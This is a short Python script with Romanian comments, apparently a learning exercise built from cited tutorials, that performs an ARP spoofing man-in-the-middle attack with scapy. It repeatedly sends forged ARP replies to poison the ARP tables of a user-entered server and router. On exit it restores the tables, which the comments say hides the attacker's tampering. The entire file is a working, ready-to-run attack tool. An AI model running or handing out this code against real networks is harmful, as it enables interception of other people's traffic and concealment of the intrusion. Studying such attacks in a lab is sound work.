'''
Surse de inspiratie:
https://www.youtube.com/watch?v=P1_P59fpdQI
https://www.geeksforgeeks.org/how-to-make-a-arp-spoofing-attack-using-scapy-python/
https://github.com/davidlares/arp-spoofing/
'''

from time import sleep

import scapy.all as scapy

def getMacAddress(ip):
    arpRequest = scapy.ARP(pdst = ip)   # setam ip-ul de destinatie pentru ARP request
    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')      # setam hardware type-ul si il punem cu valoarea de broadcast (pentru mai multa claritate: https://en.wikipedia.org/wiki/Address_Resolution_Protocol)
    packetRequest = broadcast/arpRequest   # concatenam
    # s=send r=receive, p=layer 2. 5 sec va astepta pentru un raspuns altfel ii va da drop. verbose = false face ca outputul despre pachete sa nu fie asa detaliat
    # srp returneaza un tuplu de liste: ([ (pachetul ce a primit raspuns, raspunsul) ], [pachete ce n-au primit raspuns])
    arpResponse = scapy.srp(packetRequest, timeout = 5, verbose = False)[0]
    return arpResponse[0][1].hwsrc # din raspunsul primului pachet luam adresa MAC sursa(hardware address source)

def spoof(ipTarget, ipWithWrongMAC):
    macAddresTarget = getMacAddress(ipTarget) # luam adresa MAC pentru ip-ul victima
    # cream un pachet de tip response (op=2 marcheaza asta, by default e = 1). hwsrc o sa fie by default adresa MAC a middle-ului pt ca el trimite pachetul
    packetResponse = scapy.ARP(op = 2, hwdst = macAddresTarget, pdst = ipTarget, psrc = ipWithWrongMAC)
    scapy.send(packetResponse, verbose = False)

def restore(ipDestination, ipSource):
    # resetam la final adresele MAC pentru "victime", astfel ascundem ca tabela ARP a fost modificata de atacator
    macDestination = getMacAddress(ipDestination)
    macSource = getMacAddress(ipSource)
    packetResponse = scapy.ARP(op = 2, pdst = ipDestination, hwdst = macDestination, psrc = ipSource, hwsrc = macSource)
    scapy.send(packetResponse, verbose = False)

ipServer = input("Server ip:")
ipRouter = input("Router ip:")

try:
    while True:
        spoof(ipServer,ipRouter)
        spoof(ipRouter,ipServer)
        print("Packets are sending...")
        sleep(2)
except KeyboardInterrupt:
    restore(ipServer,ipRouter)
    restore(ipRouter, ipServer)
    print("Stopped")
